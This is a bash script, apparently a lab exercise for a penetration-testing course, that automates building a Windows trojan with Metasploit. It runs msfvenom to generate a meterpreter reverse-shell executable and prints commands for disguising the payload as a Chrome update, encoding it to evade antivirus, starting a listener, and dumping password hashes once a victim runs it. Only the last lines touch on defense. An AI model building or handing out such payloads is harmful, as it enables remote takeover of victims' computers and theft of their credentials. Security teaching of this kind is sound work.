#!/bin/bash
# ============================================================
#  VAPT EXP 12 — TROJAN CREATION (Metasploit / msfvenom)
#  ⚠ FOR EDUCATIONAL USE ONLY — USE IN CONTROLLED LAB ONLY ⚠
# ============================================================
echo "============================================================"
echo "  VAPT EXPERIMENT 12 : TROJAN CREATION"
echo "  Tools: Metasploit Framework + msfvenom"
echo "  ⚠  STRICTLY FOR CONTROLLED LAB ENVIRONMENT ONLY  ⚠"
echo "============================================================"

# Detect attacker IP automatically
ATTACKER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1 | head -1)
LPORT=4444

echo ""
echo "  Detected Attacker IP : $ATTACKER_IP"
echo "  Listening Port       : $LPORT"
echo ""
echo "  (If IP is wrong, set manually: export ATTACKER_IP=x.x.x.x)"
echo ""

# Use env override if set
ATTACKER_IP="${ATTACKER_IP_OVERRIDE:-$ATTACKER_IP}"

# Install Metasploit if missing
if ! command -v msfconsole &>/dev/null; then
    echo "[*] Metasploit not found. Attempting install..."
    sudo snap install metasploit-framework 2>/dev/null || \
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall && \
    chmod 755 /tmp/msfinstall && sudo /tmp/msfinstall
fi

echo "------------------------------------------------------------"
echo "  STEP 1 : Initialize Metasploit Database"
echo "------------------------------------------------------------"
echo "  Command: msfdb init"
echo ""
echo "  Run now? (auto-running...)"
sudo msfdb init 2>/dev/null
echo ""

echo "------------------------------------------------------------"
echo "  STEP 2 : GENERATE PAYLOAD — Basic Trojan (.exe)"
echo "------------------------------------------------------------"
echo ""
echo "  Command used:"
echo "  msfvenom --payload windows/meterpreter/reverse_tcp \\"
echo "           --arch x86 --format exe \\"
echo "           LHOST=$ATTACKER_IP LPORT=$LPORT \\"
echo "           > /tmp/windowsMeterpreter.exe"
echo ""

msfvenom --payload windows/meterpreter/reverse_tcp \
         --arch x86 --format exe \
         LHOST="$ATTACKER_IP" LPORT="$LPORT" \
         > /tmp/windowsMeterpreter.exe 2>/dev/null

if [ -f /tmp/windowsMeterpreter.exe ]; then
    echo "  ✔ Payload generated: /tmp/windowsMeterpreter.exe"
    ls -lh /tmp/windowsMeterpreter.exe
else
    echo "  [!] Payload generation failed — check Metasploit install."
fi

echo ""
echo "------------------------------------------------------------"
echo "  STEP 3 : GENERATE DISGUISED PAYLOAD (Embedded Trojan)"
echo "------------------------------------------------------------"
echo ""
echo "  This embeds the payload into a legitimate-looking .exe"
echo ""
echo "  Command used:"
echo "  msfvenom --payload windows/meterpreter/reverse_tcp \\"
echo "           --template /path/to/ChromeUpdate.exe \\"
echo "           --arch x86 --format exe \\"
echo "           --encoding x86/shikata_ga_nai --iterations 500 \\"
echo "           LHOST=$ATTACKER_IP LPORT=$LPORT \\"
echo "           > /tmp/windowsMeterpreter_disguised.exe"
echo ""
echo "  NOTE: Provide a real template .exe for this to work."
echo "        Replace /path/to/ChromeUpdate.exe with actual path."
echo ""

echo "------------------------------------------------------------"
echo "  STEP 4 : SET UP LISTENER in Metasploit"
echo "------------------------------------------------------------"
echo ""
echo "  Open a NEW terminal and run:"
echo ""
echo "  msfconsole"
echo "  > use exploit/multi/handler"
echo "  > set payload windows/meterpreter/reverse_tcp"
echo "  > set LHOST $ATTACKER_IP"
echo "  > set LPORT $LPORT"
echo "  > run"
echo ""
echo "  Then transfer windowsMeterpreter.exe to the target machine"
echo "  and execute it. Meterpreter session will open here."
echo ""
echo "------------------------------------------------------------"
echo "  STEP 5 : USEFUL METERPRETER COMMANDS (after connection)"
echo "------------------------------------------------------------"
echo "  sysinfo          — Target system info"
echo "  getuid           — Current user on target"
echo "  shell            — Open command shell"
echo "  screenshot       — Capture target screen"
echo "  upload / download — File transfer"
echo "  hashdump         — Dump password hashes"
echo "  exit             — Close session"
echo ""
echo "============================================================"
echo "  KEY THINGS TO OBSERVE:"
echo "  1. Payload file (.exe) generated successfully"
echo "  2. File size of the generated trojan"
echo "  3. Meterpreter session opens after victim executes file"
echo "  4. Encoding (shikata_ga_nai) obfuscates payload"
echo "  5. Reverse TCP — target connects BACK to attacker"
echo "============================================================"
echo "  HOW IT WORKS:"
echo "  - Victim downloads/runs the .exe (social engineering)"
echo "  - Payload executes silently in background"
echo "  - Reverse TCP connection made to attacker IP:PORT"
echo "  - Attacker gets full meterpreter shell on victim machine"
echo ""
echo "  DETECTION & DEFENSE:"
echo "  - Antivirus / EDR solutions detect known payloads"
echo "  - Encoding (--encoding) helps evade basic AV"
echo "  - Defense: Updated AV, email filtering, user awareness"
echo "    training, application whitelisting, network monitoring"
echo "============================================================"
